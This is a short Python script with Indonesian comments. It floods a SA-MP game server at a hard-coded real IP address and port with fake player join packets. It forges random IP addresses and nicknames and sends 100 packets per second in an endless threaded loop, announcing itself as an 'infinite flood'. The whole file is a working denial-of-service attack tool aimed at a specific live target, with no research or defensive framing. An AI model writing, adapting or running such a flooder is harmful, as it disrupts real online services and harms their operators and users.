import socket
import random
import string
import threading
import time

# Konfigurasi
IP_SERVER = "167.71.222.113"   # Server target
PORT_SERVER = 7820
BOT_PER_DETIK = 100        # Kecepatan bot dikirim

def random_name():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=10))

def random_ip():
    return ".".join(str(random.randint(1, 254)) for _ in range(4))

def fake_player():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        spoof_ip = random_ip()
        handshake = b"SAMP" + bytes([
            int(spoof_ip.split(".")[0]),
            int(spoof_ip.split(".")[1]),
            int(spoof_ip.split(".")[2]),
            int(spoof_ip.split(".")[3]),
            PORT_SERVER & 0xFF,
            PORT_SERVER >> 8
        ])
        nickname = random_name().encode("ascii") + b"\x00"
        packet = handshake + b"p" + nickname
        sock.sendto(packet, (IP_SERVER, PORT_SERVER))
        sock.close()
    except:
        pass

print(f"[*] Memulai flood infinite ke {IP_SERVER}:{PORT_SERVER}...")
time.sleep(1)

while True:
    threads = []
    for _ in range(BOT_PER_DETIK):
        t = threading.Thread(target=fake_player)
        threads.append(t)
        t.start()
    for t in threads:
        t.join()
    print(f"[+] {BOT_PER_DETIK} bot terkirim.")
